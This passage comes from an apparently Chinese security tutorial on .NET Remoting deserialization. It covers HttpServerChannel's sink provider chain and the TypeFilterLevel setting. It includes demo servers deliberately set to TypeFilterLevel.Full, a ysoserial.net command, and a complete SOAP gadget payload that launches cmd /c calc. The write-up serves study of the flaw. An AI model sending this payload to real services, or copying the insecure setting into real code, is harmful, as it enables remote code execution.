+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">ReadKey</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>客户端通过<code>Activator.GetObject</code>拿到远程对象并返回一个实例。<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060057395.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060057395.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060057395.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060057395.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060057395.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060057395.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+可以看到<code>value</code>会进行自增。</p>
+<h3 id="httpserverchannel数据包" class="heading-element"><span>HttpServerChannel数据包</span>
+  <a href="#httpserverchannel%e6%95%b0%e6%8d%ae%e5%8c%85" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061123523.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061123523.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061123523.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061123523.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061123523.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061123523.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+在<code>HttpServerChannel</code>采用soap协议传输对象，<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060130780.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060130780.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060130780.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060130780.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060130780.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060130780.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+跟进<code>this.SetupChannel()</code>进行查看一下<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131093.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131093.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131093.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131093.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131093.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131093.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+判断了自身<code>_sinkProvider</code>是否为空，如果是空则会进入<code>CreateDefaultServerProviderChain()</code><br>
+这里使用了<code>Provider</code>链，从<code>SdlChannelSinkProvider-&gt;SoapServerFormatterSinkProvider-&gt;BinaryServerFormatterSinkProvider</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131397.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131397.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131397.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131397.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131397.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131397.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+其中<br>
+<code>SdlChannelSinkProvider</code>当访问<code>?wsdl</code>才会触发返回说明文档，然后会进行<code>SoapServerFormatterSinkProvider</code>，如果<code>SoapServerFormatterSinkProvider</code>处理不了，会继续<code>BinaryServerFormatterSinkProvider</code>处理。</p>
+<h3 id="漏洞是如何产生的" class="heading-element"><span>漏洞是如何产生的？</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e6%98%af%e5%a6%82%e4%bd%95%e4%ba%a7%e7%94%9f%e7%9a%84" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在<code>SoapServerFormatterSinkProvider和BinaryServerFormatterSinkProvider</code>这两个类中，都有一个属性<code>TypeFilterLevel</code><br>
+<a href="https://learn.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.formatters.typefilterlevel?view=net-5.0"target="_blank" rel="external nofollow noopener noreferrer">https://learn.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.formatters.typefilterlevel?view=net-5.0</a><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060137943.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060137943.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060137943.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060137943.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060137943.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060137943.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+由文档可知，这个属性决定了是否完全反序列化。</p>
+<h3 id="攻击httpserverchannel" class="heading-element"><span>攻击HttpServerChannel</span>
+  <a href="#%e6%94%bb%e5%87%bbhttpserverchannel" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Demo，将<code>TypeFilterLevel</code>属性设置为<code>Full</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Remoting</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Remoting.Channels</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Remoting.Channels.Http</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">RemoteDemoObject</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">RemoteDemoServer</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">SoapServerFormatterSinkProvider</span> <span class="n">soapServerFormatterSinkProvider</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SoapServerFormatterSinkProvider</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="n">TypeFilterLevel</span> <span class="p">=</span> <span class="n">TypeFilterLevel</span><span class="p">.</span><span class="n">Full</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">};</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">            <span class="n">IDictionary</span> <span class="n">hashtables</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">hashtables</span><span class="p">[</span><span class="s">&#34;port&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="m">9999</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">            <span class="n">HttpServerChannel</span> <span class="n">httpServerChannel</span> <span class="p">=</span> <span class="k">new</span> <span class="n">HttpServerChannel</span><span class="p">(</span><span class="n">hashtables</span><span class="p">,</span><span class="n">soapServerFormatterSinkProvider</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">ChannelServices</span><span class="p">.</span><span class="n">RegisterChannel</span><span class="p">(</span><span class="n">httpServerChannel</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">RemotingConfiguration</span><span class="p">.</span><span class="n">RegisterWellKnownServiceType</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">RemoteDemoObjectClass</span><span class="p">),</span> <span class="s">&#34;RemoteDemoObjectClass.rem&#34;</span><span class="p">,</span> <span class="n">WellKnownObjectMode</span><span class="p">.</span><span class="n">Singleton</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;server has been start&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">ReadKey</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>生成<code>payload</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">nlrvana</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">ysoserial</span><span class="p">.</span><span class="nb">net-master</span><span class="p">\</span><span class="n">ysoserial</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Release</span><span class="p">&gt;</span><span class="n">ysoserial</span><span class="p">.</span><span class="py">exe</span> <span class="o">-f</span> <span class="n">soapformatter</span> <span class="n">-g</span> <span class="n">TextFormattingRunProperties</span> <span class="n">-c</span> <span class="n">calc</span>  
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nb">SOAP-ENV</span><span class="err">:</span><span class="n">Envelope</span> <span class="n">xmlns</span><span class="err">:</span><span class="n">xsi</span><span class="p">=</span><span class="s2">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="n">xmlns</span><span class="err">:</span><span class="n">xsd</span><span class="p">=</span><span class="s2">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span class="n">xmlns</span><span class="err">:</span><span class="nb">SOAP-ENC</span><span class="p">=</span><span class="s2">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span> <span class="n">xmlns</span><span class="err">:</span><span class="nb">SOAP-ENV</span><span class="p">=</span><span class="s2">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> <span class="n">xmlns</span><span class="err">:</span><span class="n">clr</span><span class="p">=</span><span class="s2">&#34;http://schemas.microsoft.com/soap/encoding/clr/1.0&#34;</span> <span class="nb">SOAP-ENV</span><span class="err">:</span><span class="n">encodingStyle</span><span class="p">=</span><span class="s2">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nb">SOAP-ENV</span><span class="err">:</span><span class="n">Body</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">a1</span><span class="err">:</span><span class="n">TextFormattingRunProperties</span> <span class="n">id</span><span class="p">=</span><span class="s2">&#34;ref-1&#34;</span> <span class="n">xmlns</span><span class="err">:</span><span class="n">a1</span><span class="p">=</span><span class="s2">&#34;http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35&#34;</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">ForegroundBrush</span> <span class="n">id</span><span class="p">=</span><span class="s2">&#34;ref-3&#34;</span><span class="p">&gt;&amp;</span><span class="c">#60;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-16&amp;#34;?&amp;#62;  </span>
+</span></span><span class="line"><span class="cl"><span class="p">&amp;</span><span class="c">#60;ObjectDataProvider MethodName=&amp;#34;Start&amp;#34; IsInitialLoadEnabled=&amp;#34;False&amp;#34; xmlns=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&amp;#34; xmlns:sd=&amp;#34;clr-namespace:System.Diagnostics;assembly=System&amp;#34; xmlns:x=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml&amp;#34;&amp;#62;  </span>
+</span></span><span class="line"><span class="cl">  <span class="p">&amp;</span><span class="c">#60;ObjectDataProvider.ObjectInstance&amp;#62;  </span>
+</span></span><span class="line"><span class="cl">    <span class="p">&amp;</span><span class="c">#60;sd:Process&amp;#62;  </span>
+</span></span><span class="line"><span class="cl">      <span class="p">&amp;</span><span class="c">#60;sd:Process.StartInfo&amp;#62;  </span>
+</span></span><span class="line"><span class="cl">        <span class="p">&amp;</span><span class="c">#60;sd:ProcessStartInfo Arguments=&amp;#34;/c calc&amp;#34; StandardErrorEncoding=&amp;#34;{x:Null}&amp;#34; StandardOutputEncoding=&amp;#34;{x:Null}&amp;#34; UserName=&amp;#34;&amp;#34; Password=&amp;#34;{x:Null}&amp;#34; Domain=&amp;#34;&amp;#34; LoadUserProfile=&amp;#34;False&amp;#34; FileName=&amp;#34;cmd&amp;#34; /&amp;#62;  </span>
+</span></span><span class="line"><span class="cl">      <span class="p">&amp;</span><span class="c">#60;/sd:Process.StartInfo&amp;#62;  </span>
+</span></span><span class="line"><span class="cl">    <span class="p">&amp;</span><span class="c">#60;/sd:Process&amp;#62;  </span>
+</span></span><span class="line"><span class="cl">  <span class="p">&amp;</span><span class="c">#60;/ObjectDataProvider.ObjectInstance&amp;#62;  </span>
+</span></span><span class="line"><span class="cl"><span class="p">&amp;</span><span class="c">#60;/ObjectDataProvider&amp;#62;&lt;/ForegroundBrush&gt;  </span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="n">a1</span><span class="err">:</span><span class="n">TextFormattingRunProperties</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nb">SOAP-ENV</span><span class="err">:</span><span class="n">Body</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nb">SOAP-ENV</span><span class="err">:</span><span class="n">Envelope</span><span class="p">&gt;</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061129886.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061129886.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061129886.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061129886.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061129886.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061129886.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="tcpserverchannel" class="heading-element"><span>TCPServerChannel</span>
+  <a href="#tcpserverchannel" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>需要修改服务端</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Remoting</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Remoting.Channels</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Remoting.Channels.Tcp</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">RemoteDemoObject</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">RemoteDemoServer</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">BinaryServerFormatterSinkProvider</span> <span class="n">binary</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryServerFormatterSinkProvider</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="n">TypeFilterLevel</span> <span class="p">=</span> <span class="n">TypeFilterLevel</span><span class="p">.</span><span class="n">Full</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">};</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">            <span class="n">IDictionary</span> <span class="n">hashtables</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">hashtables</span><span class="p">[</span><span class="s">&#34;port&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="m">9999</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">            <span class="n">TcpServerChannel</span> <span class="n">httpServerChannel</span> <span class="p">=</span> <span class="k">new</span> <span class="n">TcpServerChannel</span><span class="p">(</span><span class="n">hashtables</span><span class="p">,</span><span class="n">binary</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">ChannelServices</span><span class="p">.</span><span class="n">RegisterChannel</span><span class="p">(</span><span class="n">httpServerChannel</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">RemotingConfiguration</span><span class="p">.</span><span class="n">RegisterWellKnownServiceType</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">RemoteDemoObjectClass</span><span class="p">),</span> <span class="s">&#34;RemoteDemoObjectClass.rem&#34;</span><span class="p">,</span> <span class="n">WellKnownObjectMode</span><span class="p">.</span><span class="n">Singleton</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;server has been start&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">ReadKey</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用<code>wireshark</code>监听一下<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061217773.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061217773.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061217773.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061217773.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061217773.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061217773.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>2e 4e 45 54</code>是<code>.NET</code>开头进行二进制传输远程调用方法、类型和命名空间。</p>
+<h3 id="攻击tcpserverchannel" class="heading-element"><span>攻击TcpServerChannel</span>
+  <a href="#%e6%94%bb%e5%87%bbtcpserverchannel" class="heading-mark">
